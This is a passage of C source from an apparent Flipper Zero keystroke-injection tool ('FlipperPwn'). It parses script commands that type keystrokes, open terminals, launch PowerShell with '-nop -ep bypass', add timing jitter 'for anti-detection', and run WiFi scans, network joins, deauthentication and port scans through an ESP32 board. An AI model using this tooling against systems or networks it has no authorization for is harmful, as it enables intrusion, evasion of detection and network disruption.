            furi_hal_hid_kb_release(KEY_MOD_LEFT_GUI | HID_KEYBOARD_SPACEBAR);
            furi_delay_ms(700);
            fpwn_type_string("TextEdit");
            furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
            furi_delay_ms(2);
            furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
        } else {
            furi_hal_hid_kb_press(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_ALT | HID_KEYBOARD_T);
            furi_delay_ms(2);
            furi_hal_hid_kb_release(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_ALT | HID_KEYBOARD_T);
            furi_delay_ms(1400);
            fpwn_type_string("gedit &");
            furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
            furi_delay_ms(2);
            furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
        }
        furi_delay_ms(1500);
        return;
    }

    /* ---- STRING ---- */
    if(strncmp(line, "STRING ", 7) == 0) {
        char expanded[FPWN_MAX_LINE_LEN];
        fpwn_var_substitute(line + 7, expanded, sizeof(expanded));
        fpwn_type_string(expanded);
        return;
    }

    /* ---- STRINGLN — type string then press ENTER ---- */
    if(strncmp(line, "STRINGLN ", 9) == 0) {
        char expanded[FPWN_MAX_LINE_LEN];
        fpwn_var_substitute(line + 9, expanded, sizeof(expanded));
        fpwn_type_string(expanded);
        furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
        furi_delay_ms(2);
        furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
        return;
    }

    /* ---- STRING_DELAY <ms> <text> — type with per-character delay ---- */
    if(strncmp(line, "STRING_DELAY ", 13) == 0) {
        const char* rest = line + 13;
        char delay_buf[8];
        const char* space = strchr(rest, ' ');
        if(space) {
            size_t dlen = (size_t)(space - rest);
            if(dlen > sizeof(delay_buf) - 1) dlen = sizeof(delay_buf) - 1;
            memcpy(delay_buf, rest, dlen);
            delay_buf[dlen] = '\0';
            uint32_t char_delay = (uint32_t)atoi(delay_buf);
            const char* text = space + 1;
            while(*text) {
                fpwn_type_char(*text);
                if(char_delay > 0) furi_delay_ms(char_delay);
                text++;
            }
        }
        return;
    }

    /* ---- STRINGLN_DELAY <ms> <text> — type with per-char delay then ENTER ---- */
    if(strncmp(line, "STRINGLN_DELAY ", 15) == 0) {
        const char* rest = line + 15;
        char delay_buf[8];
        const char* space = strchr(rest, ' ');
        if(space) {
            size_t dlen = (size_t)(space - rest);
            if(dlen > sizeof(delay_buf) - 1) dlen = sizeof(delay_buf) - 1;
            memcpy(delay_buf, rest, dlen);
            delay_buf[dlen] = '\0';
            uint32_t char_delay = (uint32_t)atoi(delay_buf);
            const char* text = space + 1;
            char expanded[FPWN_MAX_LINE_LEN];
            fpwn_var_substitute(text, expanded, sizeof(expanded));
            for(const char* ch = expanded; *ch; ch++) {
                fpwn_type_char(*ch);
                if(char_delay > 0) furi_delay_ms(char_delay);
            }
        }
        furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
        furi_delay_ms(2);
        furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
        return;
    }

    /* ---- OPEN_TERMINAL — smart terminal opener for the current OS ---- */
    if(strcmp(line, "OPEN_TERMINAL") == 0) {
        FPwnOS os = fpwn_effective_os(app);
        if(os == FPwnOSWindows) {
            /* Win+R → cmd */
            furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI | HID_KEYBOARD_R);
            furi_delay_ms(2);
            furi_hal_hid_kb_release(KEY_MOD_LEFT_GUI | HID_KEYBOARD_R);
            furi_delay_ms(800);
            fpwn_type_string("cmd");
            furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
            furi_delay_ms(2);
            furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
            furi_delay_ms(1200);
        } else if(os == FPwnOSMac) {
            /* Cmd+Space → Terminal */
            furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI | HID_KEYBOARD_SPACEBAR);
            furi_delay_ms(2);
            furi_hal_hid_kb_release(KEY_MOD_LEFT_GUI | HID_KEYBOARD_SPACEBAR);
            furi_delay_ms(700);
            fpwn_type_string("Terminal");
            furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
            furi_delay_ms(2);
            furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
            furi_delay_ms(1400);
        } else {
            /* Ctrl+Alt+T (Linux) */
            furi_hal_hid_kb_press(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_ALT | HID_KEYBOARD_T);
            furi_delay_ms(2);
            furi_hal_hid_kb_release(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_ALT | HID_KEYBOARD_T);
            furi_delay_ms(1400);
        }
        return;
    }

    /* ---- OPEN_POWERSHELL — open admin PowerShell (Windows) or sudo shell (others) ---- */
    if(strcmp(line, "OPEN_POWERSHELL") == 0) {
        FPwnOS os = fpwn_effective_os(app);
        if(os == FPwnOSWindows) {
            furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI | HID_KEYBOARD_R);
            furi_delay_ms(2);
            furi_hal_hid_kb_release(KEY_MOD_LEFT_GUI | HID_KEYBOARD_R);
            furi_delay_ms(800);
            fpwn_type_string("powershell -nop -ep bypass");
            furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
            furi_delay_ms(2);
            furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
            furi_delay_ms(1500);
        } else if(os == FPwnOSMac) {
            furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI | HID_KEYBOARD_SPACEBAR);
            furi_delay_ms(2);
            furi_hal_hid_kb_release(KEY_MOD_LEFT_GUI | HID_KEYBOARD_SPACEBAR);
            furi_delay_ms(700);
            fpwn_type_string("Terminal");
            furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
            furi_delay_ms(2);
            furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
            furi_delay_ms(1400);
        } else {
            furi_hal_hid_kb_press(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_ALT | HID_KEYBOARD_T);
            furi_delay_ms(2);
            furi_hal_hid_kb_release(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_ALT | HID_KEYBOARD_T);
            furi_delay_ms(1400);
        }
        return;
    }

    /* ---- WAIT_FOR_USB — wait until USB HID is connected (30s timeout) ---- */
    if(strcmp(line, "WAIT_FOR_USB") == 0) {
        uint32_t start = furi_get_tick();
        while(!app->abort_requested && (furi_get_tick() - start) < furi_ms_to_ticks(30000)) {
            if(furi_hal_hid_is_connected()) break;
            furi_delay_ms(100);
        }
        return;
    }

    /* ---- Single named keys ---- */
    if(strcmp(line, "ENTER") == 0 || strcmp(line, "RETURN") == 0) {
        furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
        furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
        return;
    }
    if(strcmp(line, "TAB") == 0) {
        furi_hal_hid_kb_press(HID_KEYBOARD_TAB);
        furi_hal_hid_kb_release(HID_KEYBOARD_TAB);
        return;
    }
    if(strcmp(line, "ESCAPE") == 0 || strcmp(line, "ESC") == 0) {
        furi_hal_hid_kb_press(HID_KEYBOARD_ESCAPE);
        furi_hal_hid_kb_release(HID_KEYBOARD_ESCAPE);
        return;
    }
    if(strcmp(line, "BACKSPACE") == 0) {
        furi_hal_hid_kb_press(HID_KEYBOARD_DELETE);
        furi_hal_hid_kb_release(HID_KEYBOARD_DELETE);
        return;
    }
    if(strcmp(line, "DELETE") == 0) {
        furi_hal_hid_kb_press(HID_KEYBOARD_DELETE_FORWARD);
        furi_hal_hid_kb_release(HID_KEYBOARD_DELETE_FORWARD);
        return;
    }
    if(strcmp(line, "HOME") == 0) {
        furi_hal_hid_kb_press(HID_KEYBOARD_HOME);
        furi_hal_hid_kb_release(HID_KEYBOARD_HOME);
        return;
    }
    if(strcmp(line, "END") == 0) {
        furi_hal_hid_kb_press(HID_KEYBOARD_END);
        furi_hal_hid_kb_release(HID_KEYBOARD_END);
        return;
    }
    if(strcmp(line, "PAGEUP") == 0) {
        furi_hal_hid_kb_press(HID_KEYBOARD_PAGE_UP);
        furi_hal_hid_kb_release(HID_KEYBOARD_PAGE_UP);
        return;
    }
    if(strcmp(line, "PAGEDOWN") == 0) {
        furi_hal_hid_kb_press(HID_KEYBOARD_PAGE_DOWN);
        furi_hal_hid_kb_release(HID_KEYBOARD_PAGE_DOWN);
        return;
    }
    if(strcmp(line, "UP") == 0) {
        furi_hal_hid_kb_press(HID_KEYBOARD_UP_ARROW);
        furi_hal_hid_kb_release(HID_KEYBOARD_UP_ARROW);
        return;
    }
    if(strcmp(line, "DOWN") == 0) {
        furi_hal_hid_kb_press(HID_KEYBOARD_DOWN_ARROW);
        furi_hal_hid_kb_release(HID_KEYBOARD_DOWN_ARROW);
        return;
    }
    if(strcmp(line, "LEFT") == 0) {
        furi_hal_hid_kb_press(HID_KEYBOARD_LEFT_ARROW);
        furi_hal_hid_kb_release(HID_KEYBOARD_LEFT_ARROW);
        return;
    }
    if(strcmp(line, "RIGHT") == 0) {
        furi_hal_hid_kb_press(HID_KEYBOARD_RIGHT_ARROW);
        furi_hal_hid_kb_release(HID_KEYBOARD_RIGHT_ARROW);
        return;
    }

    /* ---- Lock keys (standalone) ---- */
    if(strcmp(line, "CAPSLOCK") == 0) {
        furi_hal_hid_kb_press(HID_KEYBOARD_CAPS_LOCK);
        furi_delay_ms(2);
        furi_hal_hid_kb_release(HID_KEYBOARD_CAPS_LOCK);
        return;
    }
    if(strcmp(line, "NUMLOCK") == 0) {
        furi_hal_hid_kb_press(HID_KEYPAD_NUMLOCK);
        furi_delay_ms(2);
        furi_hal_hid_kb_release(HID_KEYPAD_NUMLOCK);
        return;
    }
    if(strcmp(line, "SCROLLLOCK") == 0) {
        furi_hal_hid_kb_press(HID_KEYBOARD_SCROLL_LOCK);
        furi_delay_ms(2);
        furi_hal_hid_kb_release(HID_KEYBOARD_SCROLL_LOCK);
        return;
    }

    /* ---- Additional standalone keys ---- */
    if(strcmp(line, "MENU") == 0 || strcmp(line, "APP") == 0) {
        furi_hal_hid_kb_press(HID_KEYBOARD_APPLICATION);
        furi_delay_ms(2);
        furi_hal_hid_kb_release(HID_KEYBOARD_APPLICATION);
        return;
    }
    if(strcmp(line, "PRINTSCREEN") == 0) {
        furi_hal_hid_kb_press(HID_KEYBOARD_PRINT_SCREEN);
        furi_delay_ms(2);
        furi_hal_hid_kb_release(HID_KEYBOARD_PRINT_SCREEN);
        return;
    }
    if(strcmp(line, "INSERT") == 0) {
        furi_hal_hid_kb_press(HID_KEYBOARD_INSERT);
        furi_delay_ms(2);
        furi_hal_hid_kb_release(HID_KEYBOARD_INSERT);
        return;
    }
    if(strcmp(line, "PAUSE") == 0) {
        furi_hal_hid_kb_press(HID_KEYBOARD_PAUSE);
        furi_delay_ms(2);
        furi_hal_hid_kb_release(HID_KEYBOARD_PAUSE);
        return;
    }

    /* ---- LED — flash green notification LED ---- */
    if(strcmp(line, "LED") == 0) {
        notification_message(app->notifications, &sequence_blink_green_100);
        return;
    }

    /* ---- LED_COLOR <color> — set LED to a specific color ---- */
    if(strncmp(line, "LED_COLOR ", 10) == 0) {
        const char* color = line + 10;
        if(strcmp(color, "RED") == 0 || strcmp(color, "red") == 0) {
            notification_message(app->notifications, &sequence_blink_red_100);
        } else if(strcmp(color, "GREEN") == 0 || strcmp(color, "green") == 0) {
            notification_message(app->notifications, &sequence_blink_green_100);
        } else if(strcmp(color, "BLUE") == 0 || strcmp(color, "blue") == 0) {
            notification_message(app->notifications, &sequence_blink_blue_100);
        } else if(strcmp(color, "YELLOW") == 0 || strcmp(color, "yellow") == 0) {
            notification_message(app->notifications, &sequence_blink_yellow_100);
        } else if(strcmp(color, "CYAN") == 0 || strcmp(color, "cyan") == 0) {
            notification_message(app->notifications, &sequence_blink_cyan_100);
        } else if(strcmp(color, "MAGENTA") == 0 || strcmp(color, "magenta") == 0) {
            notification_message(app->notifications, &sequence_blink_magenta_100);
        }
        return;
    }

    /* ---- JITTER <min_ms> <max_ms> — random delay for anti-detection ---- */
    if(strncmp(line, "JITTER ", 7) == 0) {
        const char* rest = line + 7;
        const char* space = strchr(rest, ' ');
        if(space) {
            uint32_t min_ms = (uint32_t)atoi(rest);
            uint32_t max_ms = (uint32_t)atoi(space + 1);
            if(max_ms > min_ms) {
                uint32_t range = max_ms - min_ms;
                uint32_t rnd = furi_hal_random_get();
                /* Guard: range+1 can overflow to 0 when range==UINT32_MAX */
                uint32_t rnd_range = (range == UINT32_MAX) ? UINT32_MAX : range + 1;
                uint32_t delay = min_ms + (rnd % rnd_range);
                furi_delay_ms(delay);
            } else {
                furi_delay_ms(min_ms);
            }
        }
        return;
    }

    /* ---- WAIT_BUTTON — pause until user presses OK on Flipper ---- */
    if(strcmp(line, "WAIT_BUTTON") == 0) {
        with_view_model(
            app->execute_view,
            FPwnExecModel * m,
            { strncpy(m->status, "[Press OK to continue]", sizeof(m->status) - 1); },
            true);
        notification_message(app->notifications, &sequence_blink_yellow_100);
        /* Clear the flag and wait for execute_input_callback to set it on OK */
        app->wait_button_ok = false;
        while(!app->abort_requested && !app->wait_button_ok) {
            furi_delay_ms(50);
        }
        app->wait_button_ok = false;
        return;
    }

    /* ---- HOLD <key> — hold a key pressed until RELEASE ---- */
    if(strncmp(line, "HOLD ", 5) == 0) {
        const char* key_name = line + 5;
        /* Check for modifier names first */
        if(strcmp(key_name, "CTRL") == 0 || strcmp(key_name, "CONTROL") == 0) {
            furi_hal_hid_kb_press(KEY_MOD_LEFT_CTRL);
        } else if(strcmp(key_name, "ALT") == 0) {
            furi_hal_hid_kb_press(KEY_MOD_LEFT_ALT);
        } else if(strcmp(key_name, "SHIFT") == 0) {
            furi_hal_hid_kb_press(KEY_MOD_LEFT_SHIFT);
        } else if(
            strcmp(key_name, "GUI") == 0 || strcmp(key_name, "WINDOWS") == 0 ||
            strcmp(key_name, "COMMAND") == 0) {
            furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI);
        } else {
            uint16_t kc = fpwn_named_key(key_name);
            if(kc) furi_hal_hid_kb_press(kc);
        }
        return;
    }

    /* ---- RELEASE <key> — release a held key ---- */
    if(strncmp(line, "RELEASE ", 8) == 0) {
        const char* key_name = line + 8;
        if(strcmp(key_name, "CTRL") == 0 || strcmp(key_name, "CONTROL") == 0) {
            furi_hal_hid_kb_release(KEY_MOD_LEFT_CTRL);
        } else if(strcmp(key_name, "ALT") == 0) {
            furi_hal_hid_kb_release(KEY_MOD_LEFT_ALT);
        } else if(strcmp(key_name, "SHIFT") == 0) {
            furi_hal_hid_kb_release(KEY_MOD_LEFT_SHIFT);
        } else if(
            strcmp(key_name, "GUI") == 0 || strcmp(key_name, "WINDOWS") == 0 ||
            strcmp(key_name, "COMMAND") == 0) {
            furi_hal_hid_kb_release(KEY_MOD_LEFT_GUI);
        } else if(strcmp(key_name, "ALL") == 0) {
            furi_hal_hid_kb_release_all();
        } else {
            uint16_t kc = fpwn_named_key(key_name);
            if(kc) furi_hal_hid_kb_release(kc);
        }
        return;
    }
    /* RELEASE alone (no argument) — release all keys */
    if(strcmp(line, "RELEASE") == 0) {
        furi_hal_hid_kb_release_all();
        return;
    }

    /* ---- WAIT_FOR_CAPS_ON — wait until host CapsLock LED is on ---- */
    if(strcmp(line, "WAIT_FOR_CAPS_ON") == 0) {
        with_view_model(
            app->execute_view,
            FPwnExecModel * m,
            { strncpy(m->status, "[Wait: CapsLock ON]", sizeof(m->status) - 1); },
            true);
        uint32_t start = furi_get_tick();
        while(!app->abort_requested && (furi_get_tick() - start) < furi_ms_to_ticks(30000)) {
            if(furi_hal_hid_get_led_state() & HID_KB_LED_CAPS) break;
            furi_delay_ms(20);
        }
        return;
    }
    if(strcmp(line, "WAIT_FOR_CAPS_OFF") == 0) {
        with_view_model(
            app->execute_view,
            FPwnExecModel * m,
            { strncpy(m->status, "[Wait: CapsLock OFF]", sizeof(m->status) - 1); },
            true);
        uint32_t start = furi_get_tick();
        while(!app->abort_requested && (furi_get_tick() - start) < furi_ms_to_ticks(30000)) {
            if(!(furi_hal_hid_get_led_state() & HID_KB_LED_CAPS)) break;
            furi_delay_ms(20);
        }
        return;
    }
    if(strcmp(line, "WAIT_FOR_NUM_ON") == 0) {
        with_view_model(
            app->execute_view,
            FPwnExecModel * m,
            { strncpy(m->status, "[Wait: NumLock ON]", sizeof(m->status) - 1); },
            true);
        uint32_t start = furi_get_tick();
        while(!app->abort_requested && (furi_get_tick() - start) < furi_ms_to_ticks(30000)) {
            if(furi_hal_hid_get_led_state() & HID_KB_LED_NUM) break;
            furi_delay_ms(20);
        }
        return;
    }
    if(strcmp(line, "WAIT_FOR_NUM_OFF") == 0) {
        with_view_model(
            app->execute_view,
            FPwnExecModel * m,
            { strncpy(m->status, "[Wait: NumLock OFF]", sizeof(m->status) - 1); },
            true);
        uint32_t start = furi_get_tick();
        while(!app->abort_requested && (furi_get_tick() - start) < furi_ms_to_ticks(30000)) {
            if(!(furi_hal_hid_get_led_state() & HID_KB_LED_NUM)) break;
            furi_delay_ms(20);
        }
        return;
    }

    /* ---- RANDOM_STRING <length> — type random alphanumeric chars ---- */
    if(strncmp(line, "RANDOM_STRING ", 14) == 0) {
        int len = atoi(line + 14);
        if(len < 1) len = 1;
        if(len > 64) len = 64;
        static const char charset[] =
            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        for(int i = 0; i < len; i++) {
            uint32_t rnd = furi_hal_random_get();
            char c = charset[rnd % (sizeof(charset) - 1)];
            fpwn_type_char(c);
        }
        return;
    }

    /* ---- RANDOM_INT <min> <max> — type a random integer ---- */
    if(strncmp(line, "RANDOM_INT ", 11) == 0) {
        const char* rest = line + 11;
        const char* space = strchr(rest, ' ');
        if(space) {
            int32_t min_val = (int32_t)atoi(rest);
            int32_t max_val = (int32_t)atoi(space + 1);
            if(max_val >= min_val) {
                uint32_t range = (uint32_t)(max_val - min_val);
                uint32_t rnd = furi_hal_random_get();
                /* Guard: range+1 can overflow to 0 when range==UINT32_MAX */
                uint32_t rnd_range = (range == UINT32_MAX) ? UINT32_MAX : range + 1;
                int32_t val = min_val + (int32_t)(rnd % rnd_range);
                char buf[16];
                snprintf(buf, sizeof(buf), "%ld", (long)val);
                fpwn_type_string(buf);
            }
        }
        return;
    }

    /* ---- ALTCODE <code> — type a character via Windows ALT+numpad code ---- */
    if(strncmp(line, "ALTCODE ", 8) == 0) {
        int code = atoi(line + 8);
        if(code > 0 && code <= 255) {
            /* Hold ALT, type digits on numpad, release ALT */
            furi_hal_hid_kb_press(KEY_MOD_LEFT_ALT);
            furi_delay_ms(20);
            char digits[8];
            snprintf(digits, sizeof(digits), "%d", code);
            static const uint16_t numpad_keys[] = {
                HID_KEYPAD_0,
                HID_KEYPAD_1,
                HID_KEYPAD_2,
                HID_KEYPAD_3,
                HID_KEYPAD_4,
                HID_KEYPAD_5,
                HID_KEYPAD_6,
                HID_KEYPAD_7,
                HID_KEYPAD_8,
                HID_KEYPAD_9,
            };
            for(const char* d = digits; *d; d++) {
                if(*d >= '0' && *d <= '9') {
                    uint16_t kc = numpad_keys[*d - '0'];
                    furi_hal_hid_kb_press(KEY_MOD_LEFT_ALT | kc);
                    furi_delay_ms(10);
                    furi_hal_hid_kb_release(KEY_MOD_LEFT_ALT | kc);
                    furi_delay_ms(10);
                }
            }
            furi_hal_hid_kb_release(KEY_MOD_LEFT_ALT);
        }
        return;
    }

    /* ---- SYSRQ <key> — Linux Magic SysRq Key combo ---- */
    if(strncmp(line, "SYSRQ ", 6) == 0) {
        uint16_t kc = fpwn_named_key(line + 6);
        if(kc) {
            furi_hal_hid_kb_press(KEY_MOD_LEFT_ALT | HID_KEYBOARD_PRINT_SCREEN);
            furi_delay_ms(50);
            furi_hal_hid_kb_press(KEY_MOD_LEFT_ALT | HID_KEYBOARD_PRINT_SCREEN | kc);
            furi_delay_ms(50);
            furi_hal_hid_kb_release_all();
        }
        return;
    }

    /* ---- TYPE_FILE <filename> — type contents of SD card file as keystrokes ---- */
    if(strncmp(line, "TYPE_FILE ", 10) == 0) {
        const char* fname = line + 10;
        char fpath[FPWN_PATH_LEN];
        /* If path starts with / it's absolute; otherwise relative to modules dir */
        if(fname[0] == '/') {
            strncpy(fpath, fname, sizeof(fpath) - 1);
        } else {
            snprintf(fpath, sizeof(fpath), "%s/%s", FPWN_MODULES_DIR, fname);
        }
        fpath[sizeof(fpath) - 1] = '\0';
        File* tf = storage_file_alloc(app->storage);
        if(storage_file_open(tf, fpath, FSAM_READ, FSOM_OPEN_EXISTING)) {
            char tbuf[64];
            uint16_t bread;
            while((bread = storage_file_read(tf, tbuf, sizeof(tbuf) - 1)) > 0) {
                tbuf[bread] = '\0';
                fpwn_type_string(tbuf);
                if(app->abort_requested) break;
            }
            storage_file_close(tf);
        } else {
            FURI_LOG_W(TAG, "TYPE_FILE: cannot open %s", fpath);
        }
        storage_file_free(tf);
        return;
    }

    /* ---- SAVE_WIFI — save all WiFi results to SD card from a script ---- */
    if(strcmp(line, "SAVE_WIFI") == 0) {
        if(!app->marauder) {
            FURI_LOG_W(TAG, "SAVE_WIFI: no marauder, skipping");
            return;
        }
        /* Write results to a timestamped file */
        storage_common_mkdir(app->storage, EXT_PATH("flipperpwn"));
        storage_common_mkdir(app->storage, EXT_PATH("flipperpwn/wifi"));
        char save_path[128];
        snprintf(
            save_path,
            sizeof(save_path),
            EXT_PATH("flipperpwn/wifi/script_%lu.txt"),
            (unsigned long)furi_get_tick());
        File* sf = storage_file_alloc(app->storage);
        if(storage_file_open(sf, save_path, FSAM_WRITE, FSOM_CREATE_NEW)) {
            char buf[160];
            uint32_t ac = 0;
            FPwnWifiAP* aps = fpwn_marauder_get_aps(app->marauder, &ac);
            for(uint32_t i = 0; i < ac; i++) {
                int n = snprintf(
                    buf,
                    sizeof(buf),
                    "%s %s %ddBm CH%u\n",
                    aps[i].ssid,
                    aps[i].bssid,
                    (int)aps[i].rssi,
                    (unsigned)aps[i].channel);
                if(n > 0 && n < (int)sizeof(buf)) storage_file_write(sf, buf, (uint16_t)n);
            }
            uint32_t hc = 0;
            FPwnNetHost* hosts = fpwn_marauder_get_hosts(app->marauder, &hc);
            for(uint32_t i = 0; i < hc; i++) {
                if(!hosts[i].alive) continue;
                int n = snprintf(buf, sizeof(buf), "%s alive\n", hosts[i].ip);
                if(n > 0 && n < (int)sizeof(buf)) storage_file_write(sf, buf, (uint16_t)n);
            }
            storage_file_close(sf);
            FURI_LOG_I(TAG, "SAVE_WIFI: saved to %s", save_path);
        }
        storage_file_free(sf);
        return;
    }

    /* ---- Modifier combos ---- */

    /* CTRL ALT SHIFT <key> — three-modifier combo; check before two-mod variants */
    if(strncmp(line, "CTRL ALT SHIFT ", 15) == 0) {
        uint16_t kc = fpwn_named_key(line + 15);
        if(kc) {
            furi_hal_hid_kb_press(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_ALT | KEY_MOD_LEFT_SHIFT | kc);
            furi_delay_ms(30);
            furi_hal_hid_kb_release(
                KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_ALT | KEY_MOD_LEFT_SHIFT | kc);
        }
        return;
    }

    /* CTRL SHIFT <key> — must check before lone CTRL */
    if(strncmp(line, "CTRL SHIFT ", 11) == 0) {
        uint16_t kc = fpwn_named_key(line + 11);
        if(kc) {
            furi_hal_hid_kb_press(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_SHIFT | kc);
            furi_delay_ms(30);
            furi_hal_hid_kb_release(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_SHIFT | kc);
        }
        return;
    }

    /* ALT SHIFT <key> — must check before lone ALT/SHIFT */
    if(strncmp(line, "ALT SHIFT ", 10) == 0) {
        uint16_t kc = fpwn_named_key(line + 10);
        if(kc) {
            furi_hal_hid_kb_press(KEY_MOD_LEFT_ALT | KEY_MOD_LEFT_SHIFT | kc);
            furi_delay_ms(30);
            furi_hal_hid_kb_release(KEY_MOD_LEFT_ALT | KEY_MOD_LEFT_SHIFT | kc);
        }
        return;
    }

    /* CTRL GUI <key> — must check before lone CTRL/GUI */
    if(strncmp(line, "CTRL GUI ", 9) == 0) {
        uint16_t kc = fpwn_named_key(line + 9);
        if(kc) {
            furi_hal_hid_kb_press(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_GUI | kc);
            furi_delay_ms(30);
            furi_hal_hid_kb_release(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_GUI | kc);
        }
        return;
    }

    /* CTRL ALT <key> — must check before lone CTRL/ALT */
    if(strncmp(line, "CTRL ALT ", 9) == 0) {
        uint16_t kc = fpwn_named_key(line + 9);
        if(kc) {
            furi_hal_hid_kb_press(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_ALT | kc);
            furi_delay_ms(30);
            furi_hal_hid_kb_release(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_ALT | kc);
        }
        return;
    }

    /* CTRL <key> */
    if(strncmp(line, "CTRL ", 5) == 0) {
        uint16_t kc = fpwn_named_key(line + 5);
        if(kc) {
            furi_hal_hid_kb_press(KEY_MOD_LEFT_CTRL | kc);
            furi_delay_ms(30);
            furi_hal_hid_kb_release(KEY_MOD_LEFT_CTRL | kc);
        }
        return;
    }

    /* ALT <key> */
    if(strncmp(line, "ALT ", 4) == 0) {
        uint16_t kc = fpwn_named_key(line + 4);
        if(kc) {
            furi_hal_hid_kb_press(KEY_MOD_LEFT_ALT | kc);
            furi_delay_ms(30);
            furi_hal_hid_kb_release(KEY_MOD_LEFT_ALT | kc);
        }
        return;
    }

    /* SHIFT <key> */
    if(strncmp(line, "SHIFT ", 6) == 0) {
        uint16_t kc = fpwn_named_key(line + 6);
        if(kc) {
            furi_hal_hid_kb_press(KEY_MOD_LEFT_SHIFT | kc);
            furi_delay_ms(30);
            furi_hal_hid_kb_release(KEY_MOD_LEFT_SHIFT | kc);
        }
        return;
    }

    /* GUI / WINDOWS / COMMAND <key> */
    const char* gui_arg = NULL;
    if(strncmp(line, "GUI ", 4) == 0)
        gui_arg = line + 4;
    else if(strncmp(line, "WINDOWS ", 8) == 0)
        gui_arg = line + 8;
    else if(strncmp(line, "COMMAND ", 8) == 0)
        gui_arg = line + 8;

    if(gui_arg) {
        uint16_t kc = fpwn_named_key(gui_arg);
        if(kc) {
            furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI | kc);
            furi_delay_ms(30);
            furi_hal_hid_kb_release(KEY_MOD_LEFT_GUI | kc);
        }
        return;
    }

    /* Function keys as standalone lines (F1…F12) */
    uint16_t fkey = fpwn_named_key(line);
    if(fkey) {
        furi_hal_hid_kb_press(fkey);
        furi_hal_hid_kb_release(fkey);
        return;
    }

    /* ---- WiFi commands (require ESP32 Dev Board) ---- */

    /* WIFI_SCAN — trigger AP scan and wait for results */
    if(strcmp(line, "WIFI_SCAN") == 0) {
        if(!app->marauder || !app->wifi_uart || !fpwn_wifi_uart_is_connected(app->wifi_uart)) {
            FURI_LOG_W(TAG, "WIFI_SCAN: ESP32 not connected, skipping");
            return;
        }
        fpwn_marauder_scan_ap(app->marauder);
        /* Wait up to 10 seconds for scan results */
        for(int i = 0; i < 100; i++) {
            furi_delay_ms(100);
            if(fpwn_marauder_get_state(app->marauder) == FPwnMarauderStateIdle) break;
        }
        fpwn_marauder_stop_scan(app->marauder);
        return;
    }

    /* WIFI_JOIN <SSID> <PASSWORD> */
    if(strncmp(line, "WIFI_JOIN ", 10) == 0) {
        if(!app->marauder || !app->wifi_uart || !fpwn_wifi_uart_is_connected(app->wifi_uart)) {
            FURI_LOG_W(TAG, "WIFI_JOIN: ESP32 not connected, skipping");
            return;
        }
        const char* args = line + 10;
        /* Parse SSID (first token) and password (remainder after first space) */
        const char* space = strchr(args, ' ');
        char ssid[33];
        char password[64];
        if(space) {
            size_t ssid_len = (size_t)(space - args);
            if(ssid_len > 32) ssid_len = 32;
            memcpy(ssid, args, ssid_len);
            ssid[ssid_len] = '\0';
            strncpy(password, space + 1, sizeof(password) - 1);
            password[sizeof(password) - 1] = '\0';
        } else {
            strncpy(ssid, args, sizeof(ssid) - 1);
            ssid[sizeof(ssid) - 1] = '\0';
            password[0] = '\0';
        }
        /* Find matching AP index in scan results; default to 0 if not found */
        uint32_t ap_count = 0;
        FPwnWifiAP* aps = fpwn_marauder_get_aps(app->marauder, &ap_count);
        uint8_t ap_idx = 0;
        for(uint32_t i = 0; i < ap_count; i++) {
            if(strcmp(aps[i].ssid, ssid) == 0) {
                ap_idx = (uint8_t)i;
                break;
            }
        }
        fpwn_marauder_join(app->marauder, ap_idx, password);
        furi_delay_ms(3000); /* Wait for association */
        return;
    }

    /* WIFI_DEAUTH */
    if(strcmp(line, "WIFI_DEAUTH") == 0) {
        if(!app->marauder || !app->wifi_uart || !fpwn_wifi_uart_is_connected(app->wifi_uart)) {
            FURI_LOG_W(TAG, "WIFI_DEAUTH: ESP32 not connected, skipping");
            return;
        }
        fpwn_marauder_deauth(app->marauder);
        return;
    }

    /* PING_SCAN */
    if(strcmp(line, "PING_SCAN") == 0) {
        if(!app->marauder || !app->wifi_uart || !fpwn_wifi_uart_is_connected(app->wifi_uart)) {
            FURI_LOG_W(TAG, "PING_SCAN: ESP32 not connected, skipping");
            return;
        }
        fpwn_marauder_ping_scan(app->marauder);
        /* Wait up to 30 seconds for ping scan */
        for(int i = 0; i < 300; i++) {
            furi_delay_ms(100);
            if(fpwn_marauder_get_state(app->marauder) == FPwnMarauderStateIdle) break;
        }
        return;
    }

    /* PORT_SCAN <TARGET_IP> */
    if(strncmp(line, "PORT_SCAN ", 10) == 0) {
